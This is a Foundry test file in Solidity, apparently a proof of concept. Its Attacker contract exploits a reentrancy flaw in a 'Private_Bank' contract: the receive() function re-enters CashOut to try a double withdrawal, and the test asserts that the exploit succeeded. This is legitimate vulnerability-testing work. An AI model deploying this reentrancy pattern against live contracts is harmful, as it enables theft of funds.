
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";
import {Private_Bank, Log} from "../src/Private_Bank.sol";

contract TestReentrancyPrivateBank is Test {
    Private_Bank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        Log transferLog = new Log();
        _contractUnderTest = new Private_Bank(address(transferLog));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > _contractUnderTest.MinDeposit());
        vm.assume(attackVal < type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Private_Bank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = Private_Bank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        victim.Deposit{value: val}();
        storedVal = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        victim.CashOut(val);
        uint256 finalBalance = address(this).balance;
        if (finalBalance == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.CashOut(storedVal);
            revert("Reentrancy exploit");
        }
    }
}
